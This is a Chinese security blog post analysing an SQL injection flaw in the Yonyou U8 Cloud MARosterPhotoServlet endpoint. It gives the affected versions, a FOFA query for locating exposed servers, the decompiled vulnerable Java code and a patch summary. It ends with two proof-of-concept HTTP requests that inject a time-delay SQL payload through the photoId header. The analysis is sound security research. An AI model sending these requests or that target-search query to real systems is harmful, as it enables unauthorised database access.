---
title: "用友U8 Cloud MARosterPhotoServlet SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html
asset_dir: assets/用友u8-cloud-marosterphotoservlet-sql注入漏洞
---

# 用友U8 Cloud MARosterPhotoServlet SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/5 18:26
* 1039浏览
* [0评论](#comment)
* 48分钟阅读

深入探索

SQL

Cloud

server


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")U8 [Cloud](#) MARosterPhotoServlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

云存储

# 影响版本

1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp

# fofa语法

> `app="用友-U8-Cloud"`

# 漏洞分析

深入探索

漏洞扫描服务

安全研究报告

授权

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 MARosterPhotoServlet 接口

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-001-79815115635f.webp)](https://image.mrxn.net/d5c8d7f33f014d05980bec12194da4a4.webp)

直接看 MARosterPhotoServlet 的实现

SQL注入防护

```
package com.yonyou.ma.roster.servlet;

import com.yonyou.ma.roster.module.RosterPhoto;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import nc.bcmanage.bs.IBusiCenterManageService;
import nc.bcmanage.vo.BusiCenterVO;
import nc.bs.dao.BaseDAO;
import nc.bs.framework.adaptor.IHttpServletAdaptor;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.NetStreamContext;
import nc.bs.framework.server.ISecurityTokenCallback;
import nc.bs.logging.Logger;
import nc.bs.uap.lock.PKLock;
import nc.jdbc.framework.processor.BeanProcessor;
import nc.jdbc.framework.processor.ResultSetProcessor;
import nc.login.bs.LoginVerifyBean;
import nc.vo.pub.BusinessException;

public class MARosterPhotoServlet
extends HttpServlet
implements IHttpServletAdaptor {
    private static final long serialVersionUID = 1L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doAction(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doAction(req, resp);
    }

    public void doAction(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String photoId = request.getHeader("photoId");
        String type = request.getHeader("type");
        if (photoId != null) {
            try {
                String accountcode = request.getHeader("accountcode");
                if (accountcode != null && !accountcode.trim().equals("")) {
                    IBusiCenterManageService bcservice = (IBusiCenterManageService)NCLocator.getInstance().lookup(IBusiCenterManageService.class);
                    BusiCenterVO centervo = bcservice.getBusiCenterByCode(accountcode);
                    InvocationInfoProxy.getInstance().setUserDataSource(centervo.getDataSourceName());
                }
                BaseDAO dao = new BaseDAO();
                if (type.equals("pid")) {
                    String sql = "select bd_psndoc.photo, sm_user.cuserid userid from bd_psndoc  left join sm_user on sm_user.pk_psndoc = bd_psndoc.pk_psndoc  where bd_psndoc.pk_psndoc = '" + photoId + "'";
                    RosterPhoto rosterPhoto = (RosterPhoto)dao.executeQuery(sql, (ResultSetProcessor)new BeanProcessor(RosterPhoto.class));
                    if (rosterPhoto.getUserid() != null && !"".equals(rosterPhoto.getUserid().trim())) {
                        response.setHeader("uid", rosterPhoto.getUserid());
                    }
                    response.getOutputStream().write(rosterPhoto.getPhoto() == null ? "".getBytes() : rosterPhoto.getPhoto());
                } else {
                    String getpidsql = "select t.photo photo, u.cuserid userid from sm_user u  left join  bd_psndoc t on t.pk_psndoc = u.pk_psndoc where u.cuserid = '" + photoId + "'";
                    RosterPhoto rosterPhoto = (RosterPhoto)dao.executeQuery(getpidsql, (ResultSetProcessor)new BeanProcessor(RosterPhoto.class));
                    if (rosterPhoto.getUserid() != null && !"".equals(rosterPhoto.getUserid().trim())) {
                        response.setHeader("uid", rosterPhoto.getUserid());
                    }
                    response.getOutputStream().write(rosterPhoto.getPhoto() == null ? "".getBytes() : rosterPhoto.getPhoto());
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
```

通过 header 获取 photoId 和 type ，当 photoId 不等于null时，进入处理逻辑，无论 type 是否等于 pid 都会将 photoId 直接拼接进SQL语句中执行，造成SQL注入漏洞。

代码安全审计

调试也可以看到SQL语句传入直接拼接到SQL语句中，最终调用 (RosterPhoto)dao.executeQuery 执行拼接后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-002-bbad7f0f2be5.webp)](https://image.mrxn.net/93faafeee7fd4f6988d1b95e760a821f.webp)

根据补丁对比查看可知，修复方式是参数化+预编译处理来预防SQL注入漏洞。

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-003-95cf59e9329b.webp)](https://image.mrxn.net/afb2de0cde0b4a1392ebbab6f75ba7ea.webp)

# 漏洞复现

漏洞利用示例

漏洞修复方案

```
GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0
Host: u8cloud.mrxn.net
accountcode: U8cloud
type: pid
photoId: 1';waitfor delay'0:0:4'-- Alks
```

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-004-71ffcbcf187f.webp)](https://image.mrxn.net/ca221ba2b1854d0e854651292cd20c8e.webp)

成功延时 4 秒

这个漏洞其实还影响用友NC系列

```
GET /servlet/~pubapp/com.yonyou.ma.roster.servlet.MARosterPhotoServlet HTTP/1.0
Host: nc.mrxn.net
accountcode: U8cloud
type: pid
photoId: 1';waitfor delay'0:0:4'-- Alks
```

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=398`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALV0lEQVR4AeycgXIcuQ1E993//7NjqO+NSAy5s7LP1lZlVAc30d3AUAQnK12c/PN4PH78SvxoX72Hsry52PlX852v+F3vzpe3Qn6H5alQr3WFuVhcRc+L+2rUQH7W3P+8ywkcA/k53ccrcbVxe+jrufwOgQdw7EWffUSIT70QZg6SQ7A8Fb0HzDok776qrYDoECxuFdZf4Vh7DGQk7/X3ncBpIJCpw4xXW/QW6IPUm3fUD7NPXj/MOiTvvvLLicVVmIvFrQLm3pC8e6/6dD+kD8zYfZWfBlLkHd93Av/5QCC3wFsEySG4+1b1q8Psh3VuXaG1YnEV5iLMveTLW2H+KlZNxav+Z77/fCDPHnZr1yfw2wOB+bbVTamA8LWucCsQHoKlVUByfcWtQl2E1MEZ9YgQz6pvcRBd/xVWTcWV7yv6bw/kKw+7vdcncBpITXwVu1Z61YEHP0Me5lsnL1rXc5jr9In6V6hnhzD3huT2gjmXFyH6rn/nrevYfZWfBlLkHd93AsdAIFOH59i3CvF3vufeDpj9sM53/t4XUg906ciB5W//h+FiAanf2WCtQ3h4jmPfYyAjea+/7wT+8SZ+Fa+2DLkV9oVfy30OpN5ctH+hnAipKa0Ckne95+WtgPhrXQHr3HqxvL8a9xviKb4JngYCuQUQ7PuE8BDsujdDHp77IHqvs36HkDo4ozX2hHjkRXVRHmY/JNcHyfV3HmYd5ty6FZ4GsjLd3N87gX/g9enVtrwNYnGrUO8IeR4E1Vc9VtxX/JBn9D67HvI7hPTreu//ag7pN/rvN2Q8jTdYnwbSpw+ZIszo3vWbd4TUye/8EB8E9Q84LVd9OtfzqcHPBPIsWONPy8c/EP0jGf6A8BD0eeJg/VhCfB/Jzz9WvtNAfvruf77xBI7fQ/oeYJ6mep8qxAczXvnVRfuKOx7m5+gvtKZjaRWd3+XlrdjpkD3sdHlY+yA8nPF+Qzy9N8HjpyzItPq+6qaMAfFBcOeXh/ggKG9PcxHiU4fk6vIiRIdP1AvhzEWYeXuJO59898nD3Fdev9h588L7DalTeKM4PkNemV7tu/uKGwNySyA4auMaosOMr/Yfe/W1PUT1XQ7zHvSL1okQv3nHXgfxX/Gl329IncIbxekzBOZpQnKY0Vvh92L+Klq3Q8jzum7/zr+SQ3r2Hubirhek/kqH+CCoH5JD0OeNeL8hntab4PEZ4n6cFmSKnVfvvPmraB/ROpif23lY6/qeoc+C9AAeLMIe+nsuD3OfnU9e3NUDj/sNebzX1/EZ4tTcnrkoD+tbAWv+1br+HPMdQp5n/1cQ5hp7v1JbHkg9BK0Xy1MB0SFY3CqsG/F+Q1Yn9Y3c8RkCmSYE3RPM+TjNWkP0WldY96tYPSqsh/Tf5eU19IiQWgjqE/WJ8hA/zLjzyXe0n3zP5eHzOfcb4qm8CW4/QyBT6/uE8BDsU++59fIizPWQXD/MuXxHiA/o0ul/haUB+Ph7WhCUF92jKL9DSJ/uh/DWwfO8fPcbUqfwRnEaiFPuCJmuvN8DhIc16hMhvt6n6+bdZ/4MIc/Y9ei8veQh9RDsur6OsPa/Wl/9TgMp8o7vO4HTQCBT3m0JZn03fXmIH4Kd789Rl4fUwYwrXe6qhz5Y91TvaF9InXnHx+PxUSr/k